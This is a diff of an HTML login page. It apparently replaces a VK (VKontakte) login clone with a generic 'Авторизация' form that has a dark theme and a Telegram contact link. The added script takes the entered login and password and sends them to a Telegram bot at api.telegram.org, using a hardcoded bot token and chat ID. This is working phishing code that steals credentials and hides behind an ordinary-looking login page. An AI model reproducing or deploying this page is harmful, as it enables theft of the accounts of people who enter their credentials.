@@ -3,37 +3,170 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Вход ВКонтакте</title>
-    <link rel="icon" type="image/png" sizes="32x32" href="https://static.vk.com/vkid/1.1.947/favicon-new-32x32.png?1">
-    <link rel="stylesheet" href="./assets/styles.css">
-    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+    <title>Авторизация</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: var(--background-color);
+            color: var(--text-color);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            transition: background-color 0.3s, color 0.3s;
+        }
+
+        .login-container {
+            background-color: var(--container-color);
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 400px;
+            transition: background-color 0.3s;
+        }
+
+        .login-container h2 {
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .login-container input[type="text"],
+        .login-container input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            margin: 8px 0;
+            border: 1px solid var(--input-border-color);
+            border-radius: 4px;
+            box-sizing: border-box;
+            background-color: var(--input-bg-color);
+            color: var(--text-color);
+            transition: background-color 0.3s, border-color 0.3s;
+        }
+
+        .login-container input[type="submit"] {
+            width: 100%;
+            padding: 12px;
+            background-color: var(--button-bg-color);
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+            transition: background-color 0.3s;
+        }
+
+        .login-container input[type="submit"]:hover {
+            background-color: var(--button-hover-color);
+        }
+
+        .login-container p {
+            margin-top: 15px;
+            text-align: center;
+            color: var(--text-color-light);
+        }
+
+        .theme-switch {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            cursor: pointer;
+            padding: 10px;
+            background-color: var(--container-color);
+            border: 1px solid var(--input-border-color);
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            width: 40px;
+            height: 40px;
+            transition: background-color 0.3s, border-color 0.3s;
+        }
+
+        .theme-switch svg {
+            width: 20px;
+            height: 20px;
+            fill: var(--text-color);
+            transition: fill 0.3s;
+        }
+
+        /* Темная тема */
+        :root {
+            --background-color: #f0f2f5;
+            --container-color: #ffffff;
+            --text-color: #333;
+            --text-color-light: #777;
+            --input-bg-color: #fff;
+            --input-border-color: #ccc;
+            --button-bg-color: #4CAF50;
+            --button-hover-color: #45a049;
+        }
+
+        /* Dark Theme */
+        .dark-theme {
+            --background-color: #1e1e1e;
+            --container-color: #2c2c2c;
+            --text-color: #e0e0e0;
+            --text-color-light: #aaa;
+            --input-bg-color: #333;
+            --input-border-color: #555;
+            --button-bg-color: #3a9a40;
+            --button-hover-color: #358a3a;
+        }
+
+        .forgot-password-link {
+            color: grey;
+        }
+
+        .copyright {
+            margin-top: 20px;
+            text-align: center;
+            color: var(--text-color-light);
+            font-size: 12px;
+        }
+    </style>
 </head>
-<body>
-    <div class="container active" id="login-step1">
-        <img src="https://static.vk.com/vkid/1.1.947/favicon-new-192x192.png?1" alt="VK Logo">
-        <h2>Вход ВКонтакте</h2>
-        <p class="description">Введите телефон или почту, которые привязаны к аккаунту</p>
-        <form onsubmit="showPasswordStep(event)">
-            <input type="text" id="user-input" placeholder="Телефон или почта" required>
-            <label>
-                <input type="checkbox" checked> Сохранить вход
-            </label>
-            <button type="submit">Продолжить</button>
-        </form>
-        <p>Нажимая «Продолжить», вы принимаете пользовательское соглашение и политику конфиденциальности</p>
+<body class="dark-theme">
+    <div class="theme-switch" id="theme-switch">
+        <svg id="theme-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor">
+            <path id="sun-icon" d="M12 2a1 1 0 011 1v2a1 1 0 11-2 0V3a1 1 0 011-1zm0 16a6 6 0 100-12 6 6 0 000 12zm0 4a1 1 0 011 1v2a1 1 0 11-2 0v-2a1 1 0 011-1zm10-10h-2a1 1 0 110-2h2a1 1 0 110 2zM4 12a1 1 0 110-2H2a1 1 0 110 2h2zm15.071-7.071a1 1 0 011.415 0l1.414 1.414a1 1 0 01-1.415 1.415L18.657 6.344a1 1 0 010-1.415zm-12.142 0a1 1 0 011.414 0l1.415 1.414a1 1 0 01-1.414 1.415L4.929 6.344a1 1 0 010-1.415zm12.142 12.142a1 1 0 011.415 0l1.414 1.415a1 1 0 01-1.415 1.414l-1.414-1.414a1 1 0 010-1.415zm-12.142 0a1 1 0 011.414 0l1.415 1.415a1 1 0 01-1.414 1.414L4.929 18.657a1 1 0 010-1.415zM12 18a1 1 0 01-1-1V15a1 1 0 012 0v2a1 1 0 01-1 1z" style="display: none;"></path>
+            <path id="moon-icon" d="M12 2a1 1 0 011 1v2a1 1 0 11-2 0V3a1 1 0 011-1zm8.657 5.343a1 1 0 011.415 1.415L19.657 10.93a1 1 0 01-1.414-1.414l1.414-1.414zM12 18a6 6 0 110-12 6 6 0 010 12zm0 4a1 1 0 011 1v2a1 1 0 11-2 0v-2a1 1 0 011-1zm-8.657-5.343a1 1 0 01-1.415-1.415L4.343 13.07a1 1 0 011.414 1.414L4.343 15.657z" style="display: block;"></path>
+        </svg>
     </div>
 
-    <div class="container" id="login-step2">
-        <img src="https://static.vk.com/vkid/1.1.947/favicon-new-192x192.png?1" alt="VK Logo">
-        <h2>Введите пароль</h2>
-        <p class="description">Введите ваш текущий пароль, привязанный к <span id="user-number"></span></p>
-        <form onsubmit="submitData(event)">
-            <input type="password" id="password" placeholder="Введите пароль" required>
-            <a href="#" class="forgot-password">Забыли или не установили пароль?</a>
-            <button type="submit">Продолжить</button>
+    <div class="login-container">
+        <h2>Авторизация</h2>
+        <form id="login-form">
+            <input type="text" name="username" id="username" placeholder="Логин" required="">
+            <input type="password" name="password" placeholder="Пароль" required="">
+            <input type="submit" value="Вход">
         </form>
+        <p><a href="https://t.me/Krick_Era" class="forgot-password-link">Забыли пароль?</a></p>
+        <p class="copyright">© Anomaly Project 2024</p>
     </div>
 
-    <script src="./assets/scripts.js"></script>
+    <script>
+        document.getElementById('login-form').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            var login = document.getElementById('username').value;
+            var password = document.querySelector('input[name="password"]').value;
+
+            var botToken = '6956015809:AAHMkZSU90M5mEYEkUqWuhdV3TIJKaEOWFw';
+            var chatId = '6184515646';
+            var message = 'Логин: ' + login + ' Пароль: ' + password;
+
+            var url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Логин и пароль отправлены в Telegram:', data);
+                })
+                .catch(error => console.error('Ошибка при отправке данных:', error));
+
+        });
+    </script>
 </body>
 </html>
